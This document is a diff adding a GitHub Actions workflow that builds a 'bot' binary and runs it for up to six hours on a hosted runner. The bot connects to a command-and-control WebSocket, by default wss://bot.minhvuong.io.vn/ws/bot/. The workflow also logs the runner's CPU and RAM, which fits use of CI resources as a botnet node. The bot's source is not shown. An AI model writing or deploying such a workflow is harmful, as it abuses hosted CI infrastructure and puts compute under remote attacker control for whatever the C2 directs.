@@ -1,0 +1,52 @@
+name: Run Bot (Manual)
+
+on:
+  workflow_dispatch:
+    inputs:
+      c2_url:
+        description: 'C2 WebSocket URL (wss://...)'
+        required: true
+        default: 'wss://bot.minhvuong.io.vn/ws/bot/'
+      duration:
+        description: 'Run duration in minutes (max 360 = 6h)'
+        required: true
+        default: '360'
+
+jobs:
+  run-bot:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install deps
+        run: sudo apt-get update && sudo apt-get install -y build-essential libssl-dev zlib1g-dev
+
+      - name: Build bot
+        run: |
+          make -C src dynamic
+          chmod +x src/bot
+
+      - name: Run bot
+        run: |
+          DURATION=${{ github.event.inputs.duration }}
+          C2_URL="${{ github.event.inputs.c2_url }}"
+
+          echo "[*] Starting bot for ${DURATION} minutes"
+          echo "[*] C2: ${C2_URL}"
+          echo "[*] Runner: $(uname -a)"
+          echo "[*] CPUs: $(nproc)"
+          echo "[*] RAM: $(free -h | grep Mem | awk '{print $2}')"
+
+          # Run bot in background
+          ./src/bot "${C2_URL}" &
+          BOT_PID=$!
+          echo "[*] Bot PID: ${BOT_PID}"
+
+          # Wait for specified duration
+          sleep $((DURATION * 60))
+
+          echo "[*] Duration elapsed, stopping bot..."
+          kill $BOT_PID 2>/dev/null || true
+          wait $BOT_PID 2>/dev/null || true
+          echo "[+] Bot stopped"
